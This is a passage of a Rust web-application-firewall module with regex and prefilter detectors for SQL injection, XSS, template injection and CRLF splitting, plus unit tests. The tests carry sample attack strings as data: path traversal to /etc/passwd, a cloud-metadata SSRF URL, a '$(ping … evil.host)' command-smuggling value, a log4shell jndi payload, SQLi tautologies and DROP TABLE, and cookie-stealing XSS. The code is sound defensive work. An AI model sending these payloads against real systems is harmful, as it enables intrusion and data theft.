            b if b.is_ascii_digit() => {
                while i < bytes.len()
                    && (bytes[i].is_ascii_digit()
                        || bytes[i] == b'.'
                        || bytes[i] == b'e'
                        || bytes[i] == b'E'
                        || bytes[i] == b'x'
                        || bytes[i] == b'X')
                {
                    i += 1;
                }
                fp.push('1');
            },
            b if b.is_ascii_alphabetic() || b == b'_' => {
                let start = i;
                while i < bytes.len()
                    && (bytes[i].is_ascii_alphanumeric() || bytes[i] == b'_')
                {
                    i += 1;
                }
                let word = &lower[start..i];
                let tok = if SQL_FUNCTIONS.contains(&word) {
                    SqlTok::Function
                } else if matches!(word, "and" | "or" | "xor") {
                    SqlTok::Operator
                } else if SQL_KEYWORDS.contains(&word) {
                    SqlTok::Keyword
                } else {
                    SqlTok::Ident
                };
                fp.push(tok.fp_char());
            },
            _ => i += 1,
        }
    }
    fp
}

/// Regex set used to confirm SQLi beyond the fingerprint.
static SQLI_UNION_SELECT: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)\bunion\b[\s/*!]+(?:\ball\b[\s/*!]+)?\bselect\b").unwrap()
});
static SQLI_STACKED: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i);\s*(?:select|insert|update|delete|drop|alter|create|truncate|exec|execute|grant|revoke|declare|begin|shutdown)\b").unwrap()
});
static SQLI_DANGEROUS_FN: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)\b(?:sleep|benchmark|pg_sleep|waitfor|load_file|extractvalue|updatexml|xp_cmdshell|sp_executesql)\s*\(").unwrap()
});
static SQLI_TAUTOLOGY: Lazy<Regex> = Lazy::new(|| {
    // Classic tautology forms: `or 1=1`, `or 'a'='a`, `and 1<>0`, `|| 1`, etc.
    Regex::new(r#"(?i)(?:\bor\b|\band\b|\|\||&&)\s*(?:['"`]?[\w.]+['"`]?\s*(?:=|<>|!=|<=>|<|>)\s*['"`]?[\w.]+['"`]?|['"`][^'"`]*['"`]\s*=\s*['"`][^'"`]*['"`]|1\s*=\s*1|0\s*=\s*0)"#).unwrap()
});
static SQLI_COMMENT_TERM: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?:--\s|--$|#\s|#$|/\*[\s\S]*?\*/)").unwrap());
static SQLI_QUOTE_KEYWORD: Lazy<Regex> = Lazy::new(|| {
    // Quote followed by a *SQL-specific* keyword. `or`/`and` are deliberately
    // excluded — they are far too common in ordinary prose and the tautology
    // regex below already covers the `or 1=1` family.
    Regex::new(r#"(?i)['"][\s\S]*\b(?:union|select|insert|update|delete|drop|alter|create|truncate|exec|execute)\b"#).unwrap()
});
static SQLI_INFO_SCHEMA: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)information_schema|\bsqlite_master\b|\bpg_catalog\b|\bsysobjects\b|\bsyscolumns\b").unwrap()
});
static SQLI_INTO_FILE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)\binto\s+(?:out|dump)file\b").unwrap());

/// Needles for the SQLi prefilter. Every input that matches one of the
/// strong regexes above contains at least one of these substrings
/// (ASCII case-insensitively), so an automaton miss proves the input is
/// clean and the expensive path can be skipped.
static SQLI_PREFILTER_NEEDLES: &[&str] = &[
    "or",
    "and",
    "||",
    "&&",
    "union",
    "select",
    "insert",
    "update",
    "delete",
    "drop",
    "alter",
    "create",
    "truncate",
    "exec",
    "grant",
    "revoke",
    "declare",
    "begin",
    "shutdown",
    "sleep",
    "benchmark",
    "waitfor",
    "load_file",
    "extractvalue",
    "updatexml",
    "xp_cmdshell",
    "sp_executesql",
    "information_schema",
    "sqlite_master",
    "pg_catalog",
    "sysobjects",
    "syscolumns",
    "into",
];

static SQLI_PREFILTER: Lazy<AhoCorasick> = Lazy::new(|| {
    AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build(SQLI_PREFILTER_NEEDLES)
        .expect("aho-corasick build cannot fail with valid UTF-8 needles")
});

/// Detect SQL injection using token fingerprinting plus targeted regex checks.
///
/// Returns `(is_sqli, fingerprint)`. The fingerprint encodes the
/// libinjection-style token signature followed by the names of every check
/// that fired. Only *strong* signals (structural SQL syntax) flip `is_sqli`;
/// weak signals such as a trailing comment are recorded in the fingerprint
/// but never block a request on their own, which keeps prose like
/// `"C# programming"` or `"well--done"` from tripping the detector.
///
/// Inputs rejected by the keyword prefilter return an empty fingerprint;
/// callers only inspect the fingerprint when `is_sqli` is true.
pub fn detect_sqli(input: &str) -> (bool, String) {
    if input.len() < 3 {
        return (false, String::new());
    }
    // `is_ascii` keeps the prefilter exact: the regexes use Unicode case
    // folding, which matches code points the ASCII-folded automaton misses
    // (e.g. the long-s `ſ`), so non-ASCII input always takes the full path.
    if input.is_ascii() && !SQLI_PREFILTER.is_match(input) {
        return (false, String::new());
    }
    let lower = input.to_ascii_lowercase();
    let fp = fingerprint_sql(&lower);

    let mut strong: Vec<&'static str> = Vec::with_capacity(4);
    let mut weak: Vec<&'static str> = Vec::with_capacity(2);

    if SQLI_UNION_SELECT.is_match(&lower) {
        strong.push("union-select");
    }
    if SQLI_STACKED.is_match(&lower) {
        strong.push("stacked-query");
    }
    if SQLI_DANGEROUS_FN.is_match(&lower) {
        strong.push("dangerous-function");
    }
    if SQLI_TAUTOLOGY.is_match(&lower) {
        strong.push("tautology");
    }
    if SQLI_QUOTE_KEYWORD.is_match(&lower) {
        strong.push("quote-keyword");
    }
    if SQLI_INFO_SCHEMA.is_match(&lower) {
        strong.push("info-schema");
    }
    if SQLI_INTO_FILE.is_match(&lower) {
        strong.push("into-file");
    }
    if SQLI_COMMENT_TERM.is_match(&lower) {
        weak.push("comment-terminator");
    }

    // Fingerprint-shape heuristics. These are recorded as weak signals: the
    // regexes above already cover the high-confidence cases, and shapes like
    // `;k` can occur in innocent text ("items; select your favourite").
    if fp.starts_with('s') && fp.contains("to") {
        weak.push("string-tautology");
    }
    if fp.contains(";k") {
        weak.push("stacked-shape");
    }
    if fp.contains("kf")
        && fp.contains('(')
        && SQL_FUNCTIONS.iter().any(|f| lower.contains(*f))
    {
        weak.push("fn-call-shape");
    }

    let is_sqli = !strong.is_empty();
    let fingerprint = if strong.is_empty() && weak.is_empty() {
        fp
    } else {
        let mut all = strong;
        all.extend_from_slice(&weak);
        format!("{}|{}", fp, all.join(","))
    };
    (is_sqli, fingerprint)
}

// ---------------------------------------------------------------------------
// libinjection-style XSS detection
// ---------------------------------------------------------------------------

static XSS_SCRIPT_TAG: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)<\s*/?\s*script\b").unwrap());
static XSS_EVENT_HANDLER: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)\son[a-z]+\s*=").unwrap());
static XSS_JS_URI: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)\b(?:javascript|vbscript|livescript|mocha)\s*:").unwrap()
});
static XSS_DANGEROUS_TAG: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)<\s*(?:iframe|object|embed|svg|math|form|input|body|frame|frameset|applet|meta|link|base|style|marquee|details|audio|video|template|portal)\b").unwrap()
});
static XSS_DATA_URI: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)data\s*:\s*(?:text/html|application/xhtml|text/javascript|application/javascript)").unwrap()
});
static XSS_STYLE_EXPR: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)expression\s*\(|url\s*\(\s*['\"]?\s*javascript"#).unwrap()
});
static XSS_HTML_COMMENT_BREAK: Lazy<Regex> = Lazy::new(|| {
    // `</style>`, `</title>`, `</textarea>` used to escape an HTML context.
    Regex::new(r"(?i)<\s*/\s*(?:style|title|textarea|noscript|comment)\b")
        .unwrap()
});

/// Needles for the XSS prefilter, with the same guarantee as the SQLi set:
/// every input matching one of the XSS regexes above contains at least one
/// of these substrings.
static XSS_PREFILTER_NEEDLES: &[&str] = &[
    "<",
    "on",
    "javascript",
    "vbscript",
    "livescript",
    "mocha",
    "data",
    "expression",
    "url",
];

static XSS_PREFILTER: Lazy<AhoCorasick> = Lazy::new(|| {
    AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build(XSS_PREFILTER_NEEDLES)
        .expect("aho-corasick build cannot fail with valid UTF-8 needles")
});

/// An HTML tag anywhere in the value (`<svg onload=…>`, `"><img …`) — the
/// structural marker of a payload prepared for markup execution.
static HTML_TAG_STRUCTURE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)<\s*\w{1,32}[^>]{0,200}>"#).unwrap());

/// Does the value carry HTML tag structure around the script-URI hit?
/// An injection payload needs a tag context to execute (`<svg onload=…>`,
/// `"><img src=x onerror=…>`). A script-URI quoted inside a larger
/// non-markup string — telemetry beacons re-serializing DOM attributes as
/// JSON, CSP violation reports, link dumps — is collected data and shows no
/// tag structure. Whether a bare (container-less) script URI is treated as
/// an attack is a *source* decision for the engine: a `?url=javascript:…`
/// query value is a reflected-XSS shape, a body field is collection surface.
pub fn xss_script_uri_html_shaped(input: &str) -> bool {
    HTML_TAG_STRUCTURE.is_match(input)
}

/// Detect XSS by looking for HTML tags / event handlers / dangerous URIs in
/// contexts that should not contain them.
///
/// Inputs rejected by the keyword prefilter return an empty fingerprint;
/// callers only inspect the fingerprint when `is_xss` is true.
pub fn detect_xss(input: &str) -> (bool, String) {
    if input.len() < 3 {
        return (false, String::new());
    }
    // See `detect_sqli` for why non-ASCII input bypasses the prefilter.
    if input.is_ascii() && !XSS_PREFILTER.is_match(input) {
        return (false, String::new());
    }
    let lower = input.to_ascii_lowercase();
    let mut hits: Vec<&'static str> = Vec::with_capacity(4);

    if XSS_SCRIPT_TAG.is_match(&lower) {
        hits.push("script-tag");
    }
    if XSS_EVENT_HANDLER.is_match(&lower) {
        hits.push("event-handler");
    }
    if XSS_JS_URI.is_match(&lower) {
        hits.push("js-uri");
    }
    if XSS_DANGEROUS_TAG.is_match(&lower) {
        hits.push("dangerous-tag");
    }
    if XSS_DATA_URI.is_match(&lower) {
        hits.push("data-uri");
    }
    if XSS_STYLE_EXPR.is_match(&lower) {
        hits.push("style-expr");
    }
    if XSS_HTML_COMMENT_BREAK.is_match(&lower) {
        hits.push("html-context-break");
    }

    let is_xss = !hits.is_empty();
    let fingerprint = if hits.is_empty() {
        String::new()
    } else {
        format!("xss|{}", hits.join(","))
    };
    (is_xss, fingerprint)
}

// ---------------------------------------------------------------------------
// Structural expression / template injection detection
// ---------------------------------------------------------------------------

/// Detect expression-language and template injection by *structure*, not by
/// keyword: a `${…}` / `{{…}}` / `{%…%}` / `<%=…%>` container counts as an
/// injection attempt only when its content shows interpreter-facing shape —
/// a method call, arithmetic or comparison operators, a deep accessor chain,
/// a `new` expression, or another nested container. A bare identifier like
/// `${filename}` is templating, not an attack, and stays clean.
///
/// Returns the container kind that fired, for logging.
pub fn detect_expr_injection(input: &str) -> Option<&'static str> {
    // Cheap containment prefilter; the four scans are memchr-fast.
    if !(input.contains("${")
        || input.contains("{{")
        || input.contains("{%")
        || input.contains("<%="))
    {
        return None;
    }
    const CONTAINERS: &[(&str, &str, &str)] = &[
        ("${", "}", "el"),
        ("{{", "}}", "template"),
        ("{%", "%}", "template-stmt"),
        ("<%=", "%>", "jsp"),
    ];
    for (opener, closer, kind) in CONTAINERS {
        let mut from = 0usize;
        while let Some(rel) = input[from..].find(opener) {
            let start = from + rel + opener.len();
            let Some(end_rel) = input[start..].find(closer) else {
                break;
            };
            let inner = &input[start..start + end_rel];
            if !inner.is_empty()
                && inner.len() <= 256
                && is_structural_expr(inner)
            {
                return Some(kind);
            }
            from = start + end_rel;
        }
    }
    None
}

/// Structural features that separate an evaluated expression from a literal
/// placeholder. Deliberately conservative: `/` and `-` are excluded from the
/// operator set (URL paths and hyphenated names are everywhere), and a
/// two-segment accessor chain (`user.name`) is too common in honest
/// templating to flag.
fn is_structural_expr(inner: &str) -> bool {
    // A nested container is evaluation by construction (${jndi:${sys:…}}).
    if inner.contains("${") || inner.contains("{{") || inner.contains("{%") {
        return true;
    }
    let bytes = inner.as_bytes();
    // Method or function call: identifier immediately followed by `(`.
    for w in bytes.windows(2) {
        if w[1] == b'(' && (w[0].is_ascii_alphanumeric() || w[0] == b'_') {
            return true;
        }
    }
    // Arithmetic / comparison / assignment operators between the braces
    // ({{7*7}}, ${a=b}, {% if x > 1 %}).
    if bytes.iter().any(|&c| {
        matches!(
            c,
            b'+' | b'*' | b'%' | b'|' | b'^' | b'<' | b'>' | b'=' | b'!'
        )
    }) {
        return true;
    }
    // Deep accessor chain: three or more dotted segments
    // (config.__class__.__init__.__globals__).
    if inner.split('.').filter(|s| !s.is_empty()).count() >= 3 {
        return true;
    }
    // Object construction: `new` as a standalone word.
    if inner.split_whitespace().any(|w| w == "new") {
        return true;
    }
    false
}

static JS_BRACKET_CALL: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\b\w+\[[^\]\r\n]{1,48}\]\s*[\[(]").unwrap());

static SQLI_UNION_BREAK: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)['"`]\s*union\b"#).unwrap());
static SQLI_UNION_CONST: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)union[\s/+]{1,8}select[\s/+]{0,4}(?:[\d('"*]|null\b)"#)
        .unwrap()
});
static SQLI_STMT_MARKER: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)(?:--|/\*|(?:^|\s)#)|\bfrom\b"#).unwrap());

/// Does a `union select` occurrence inside `input` look like an actual
/// injected statement rather than a search phrase quoting the keywords?
/// A real statement carries at least one of: a quote breaking out right
/// before `union`, a comment terminator, a `from` clause, or a constant
/// probe list (`union select 1,2,3` / `null,null,*`). A search query like
/// `site:x.com union select 关键字怎么用` has none of those.
pub fn sqli_union_statement_shaped(input: &str) -> bool {
    SQLI_UNION_BREAK.is_match(input)
        || SQLI_UNION_CONST.is_match(input)
        || SQLI_STMT_MARKER.is_match(input)
}

static CRLF_HEADER_SHAPE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)[\r\n]{2,}\s*[\w-]{1,32}\s*:").unwrap());

/// Does a CRLF occurrence inside `input` precede a header-name shape
/// (`…\r\nX-Foo: bar`, including mixed `\r\r\n\n` evasion)? That is
/// response-splitting material. Bare multi-line text — a multi-line form
/// input echoed into a query value, prose — is not.
pub fn crlf_header_injection_shaped(input: &str) -> bool {
    CRLF_HEADER_SHAPE.is_match(input)
}

/// Detect JavaScript bracket-call invocation (`parent['eval'](…)`,
/// `this["constructor"]["constructor"](…)`), a shape plain keyword needles
/// never see because the callee name sits inside brackets and is frequently
/// hex-escaped (`\x65val`). Structural, not lexical: an identifier followed
/// by a bracketed name and then another bracket (chain) or a call paren.
///
/// Strict-only: honest HTTP traffic essentially never carries this shape.
pub fn detect_js_call(input: &str) -> bool {
    JS_BRACKET_CALL.is_match(input)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn engine_finds_path_traversal() {
        let e = SignatureEngine::new();
        let hits = e.scan("../../etc/passwd");
        assert!(hits
            .iter()
            .any(|h| h.category == AttackCategory::PathTraversal));
    }

    #[test]
    fn engine_finds_slash_less_traversal_when_masked() {
        // "../../" consumes the "/" that "/etc/passwd" would need; the
        // slash-less PT-013 variant is what survives the overlap.
        let e = SignatureEngine::new();
        let hits = e.scan("../../../etc/passwd%00.png");
        assert!(hits.iter().any(|h| e.pattern_id(h.pattern) == "PT-013"));
    }

    #[test]
    fn js_call_detector_fires_on_bracket_invocation() {
        assert!(detect_js_call("parent['eval'](payload)"));
        assert!(detect_js_call(
            "this[\"constructor\"][\"constructor\"](atob('..'))()"
        ));
        assert!(detect_js_call("global[\\x65val](cmd)"));
        assert!(!detect_js_call("rows[0].name"));
        assert!(!detect_js_call("list[a] and list[b]"));
    }

    #[test]
    fn engine_finds_ssrf_metadata() {
        let e = SignatureEngine::new();
        let hits = e.scan("http://169.254.169.254/latest/meta-data/");
        assert!(hits.iter().any(|h| e.pattern_id(h.pattern) == "SSRF-001"));
    }

    #[test]
    fn engine_case_insensitive() {
        let e = SignatureEngine::new();
        let hits = e.scan("UNION SELECT password FROM users");
        assert!(hits.iter().any(|h| e.pattern_id(h.pattern) == "SQL-001"));
    }

    #[test]
    fn engine_dedupes() {
        let e = SignatureEngine::new();
        let hits = e.scan("../ ../ ../");
        assert_eq!(
            hits.iter()
                .filter(|h| e.pattern_id(h.pattern) == "PT-001")
                .count(),
            1
        );
    }

    #[test]
    fn strict_profile_loads_strict_only_needles() {
        let normal =
            SignatureEngine::for_profile(WafLevel::Normal, StackSet::ALL);
        let strict =
            SignatureEngine::for_profile(WafLevel::Strict, StackSet::ALL);
        assert!(strict.pattern_count() > normal.pattern_count());
        assert!(strict
            .scan("$(ping -c 1 evil.host)")
            .iter()
            .any(|h| { strict.pattern_id(h.pattern) == "CI-102" }));
        assert!(normal
            .scan("$(ping -c 1 evil.host)")
            .iter()
            .all(|h| strict.pattern_id(h.pattern) != "CI-102"));
    }

    #[test]
    fn stack_profile_drops_other_language_needles() {
        let java = SignatureEngine::for_profile(
            WafLevel::Normal,
            StackSet::GENERIC.union(StackSet::JAVA),
        );
        assert!(java
            .scan("aced0005 01 02")
            .iter()
            .any(|h| java.pattern_id(h.pattern) == "DZ-001"));
        assert!(java
            .scan("unserialize($_GET[x])")
            .iter()
            .all(|h| java.pattern_id(h.pattern) != "DZ-010"));
        let php = SignatureEngine::for_profile(
            WafLevel::Normal,
            StackSet::GENERIC.union(StackSet::PHP),
        );
        assert!(php
            .scan("test unserialize(:__wakeup)")
            .iter()
            .any(|h| php.pattern_id(h.pattern) == "DZ-005"));
    }

    #[test]
    fn log4shell_query_payload_hits_critical_needle() {
        // Regression guard for the benchmark miss: the payload lives in the
        // query string and must reach the ${jndi: needle.
        let e = SignatureEngine::for_profile(WafLevel::Normal, StackSet::ALL);
        let hits =
            e.scan("action=${jndi:ldap://${sys:java.version}.example.com}");
        assert!(hits.iter().any(|h| e.pattern_id(h.pattern) == "TI-006"));
        assert!(hits.iter().any(|h| h.severity >= 5));
    }

    #[test]
    fn detect_expr_injection_structural_payloads() {
        assert!(detect_expr_injection("{{7*7}}").is_some());
        assert!(detect_expr_injection("${System.getProperty(\"user.dir\")}")
            .is_some());
        assert!(detect_expr_injection("${jndi:${sys:java.version}}").is_some());
        assert!(
            detect_expr_injection("{{config.__class__.__init__}}").is_some()
        );
        assert!(detect_expr_injection("${new java.lang.Runtime}").is_some());
    }

    #[test]
    fn detect_expr_injection_ignores_innocent_templating() {
        assert!(detect_expr_injection("${filename}").is_none());
        assert!(detect_expr_injection("{{user.name}}").is_none());
        assert!(detect_expr_injection("plain text").is_none());
        assert!(detect_expr_injection("a/b/c${x}/d").is_none());
    }

    #[test]
    fn detect_sqli_or_1_eq_1() {
        let (hit, _fp) = detect_sqli("' OR 1=1 --");
        assert!(hit, "tautology should be detected");
    }

    #[test]
    fn detect_sqli_union_select() {
        let (hit, fp) =
            detect_sqli("1 UNION SELECT username, password FROM users");
        assert!(hit);
        assert!(fp.contains("union-select"));
    }

    #[test]
    fn detect_sqli_drop_table() {
        let (hit, _fp) = detect_sqli("1; DROP TABLE users");
        assert!(hit);
    }

    #[test]
    fn detect_sqli_sleep() {
        let (hit, fp) = detect_sqli("1 AND SLEEP(5)");
        assert!(hit);
        assert!(fp.contains("dangerous-function"));
    }

    #[test]
    fn detect_sqli_benign_input() {
        let (hit, _fp) = detect_sqli("hello world this is a normal value");
        assert!(!hit);
    }

    #[test]
    fn detect_sqli_numeric_id() {
        let (hit, _fp) = detect_sqli("12345");
        assert!(!hit);
    }

    #[test]
    fn detect_xss_script() {
        let (hit, fp) = detect_xss("<script>alert(1)</script>");
        assert!(hit);
        assert!(fp.contains("script-tag"));
    }

    #[test]
    fn detect_xss_onerror() {
        let (hit, fp) = detect_xss("<img src=x onerror=alert(1)>");
        assert!(hit);
        assert!(fp.contains("event-handler"));
    }

    #[test]
    fn detect_xss_javascript_uri() {
        let (hit, fp) = detect_xss("javascript:alert(document.cookie)");
        assert!(hit);
        assert!(fp.contains("js-uri"));
    }

    #[test]
    fn detect_xss_benign() {
        let (hit, _fp) = detect_xss("hello world");
        assert!(!hit);
    }

    #[test]
    fn detect_xss_svg_onload() {
        let (hit, fp) = detect_xss("<svg onload=alert(1)>");
        assert!(hit);
        assert!(fp.contains("dangerous-tag"));
    }

    #[test]
    fn detect_sqli_unicode_folding_takes_full_path() {
        // `ſ` (long s) Unicode-folds to `s`, so the regex still fires even
        // though the ASCII-folded prefilter would miss `ſelect`. Non-ASCII
        // input must therefore bypass the prefilter entirely.
        let (hit, fp) = detect_sqli("1 union ſelect password");
        assert!(hit);
        assert!(fp.contains("union-select"));
    }

    #[test]
    fn detect_xss_mixed_case_passes_prefilter() {
        let (hit, fp) = detect_xss("<IMG SRC=x ONERROR=alert(1)>");
        assert!(hit);
        assert!(fp.contains("event-handler"));
    }
}
